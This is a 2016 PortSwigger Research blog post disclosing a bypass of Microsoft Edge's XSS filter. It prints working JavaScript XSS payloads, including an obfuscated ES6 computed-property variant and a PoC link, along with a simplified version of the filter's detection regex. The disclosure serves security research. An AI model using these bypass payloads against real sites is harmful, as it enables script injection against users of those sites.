---
source: portswigger-research
source_url: https://portswigger.net/research/edge-xss-filter-bypass
title: "Edge XSS filter bypass | PortSwigger Research"
published: 2016-04-15T13:29:00
description: "I originally reported this issue to Microsoft on 4th September 2015 but it remains unfixed. As it has been so long since my original report I have decided to blog about the details now. IE had a flaw"
---

# Edge XSS filter bypass

![Gareth Heyes](https://portswigger.net/content/images/profiles/callout_gareth_heyes_114px.png)

### [Gareth Heyes](https://portswigger.net/research/gareth-heyes)

Researcher

[@garethheyes](https://twitter.com/garethheyes)

- **Published:** Friday, 15 April 2016 at 13:29 UTC

- **Updated:** Friday, 14 June 2019 at 12:10 UTC


I originally reported this issue to Microsoft on 4th September 2015 but it remains unfixed. As it has been so long since my original report I have decided to blog about the details now.

IE had a flaw in the past where you could use the location object as a function and combine toString/valueOf in a object literal to execute code. I think it was first discovered by [Sirdarckcat](http://twitter.com/sirdarckcat) but I may be wrong. Basically you use the object literal as a fake array which calls the join function that constructs a string from the object literal and passes it to valueOf which in turn passes it to the location object. Here is the code:

`-{toString:[].join,length:1,0:'javascript:alert(123)',valueOf:location}`

This also works on the latest version of Edge too however both browsers will detect it as a [XSS](https://portswigger.net/web-security/cross-site-scripting) attack. The XSS filter regexes detect a string followed by any number of characters, followed by either a "{" or "," then toString/valueOf and colon character. The "a" from valueOf and the "o" from toString are replaced by the "#" character. Here is a simplified version of the regex:

``["'`].*?[{,].*(valueOf|toString).*?:}``

Here are the [Regexes](http://pastebin.com/LLB4tMAS) as of October 2015.

Edge though supports ES6 and there are some useful new features. Computed properties in ES6 allow you to pass an expression to calculate the property name. For example:

`x='a';
o={[x]:123};
alert(o.a)`

I think you can see where this is going. By combining the two techniques we can bypass the Edge XSS filter. As shown earlier the regexes look for toString/valueOf unfortunately we can obfuscate them using computed properties.

`x='g',y='f',
{['toStrin'+x]:[].join,length:1,0:'java\script:alert\x28123\x29',['valueO'+y]:location}-'';`

[PoC](http://challenge.hackvertor.co.uk/script.php?x=g%27,y=%27f%27,%7B[%27toStrin%27%2bx]:[].join,length:1,0:%27java%5Cscript:alert%5Cx281%5Cx29%27,[%27valueO%27%2by]:location%7D-%27)

Visit our Web Security Academy to [learn more about cross-site scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting)

[XSS](https://portswigger.net/research/cross-site-scripting-research) [filter](https://portswigger.net/research/filter) [Edge](https://portswigger.net/research/edge)

[Back to all articles](https://portswigger.net/research/articles)

## Related Research

[**Cookie Chaos: How to bypass \_\_Host and \_\_Secure cookie prefixes** 03 September 2025Cookie Chaos: How to bypass \_\_Host and \_\_Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes) [**Stealing HttpOnly cookies with the cookie sandwich technique** 22 January 2025Stealing HttpOnly cookies with the cookie sandwich technique](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) [**Bypassing WAFs with the phantom $Version cookie** 04 December 2024Bypassing WAFs with the phantom $Version cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie) [**Concealing payloads in URL credentials** 23 October 2024Concealing payloads in URL credentials](https://portswigger.net/research/concealing-payloads-in-url-credentials)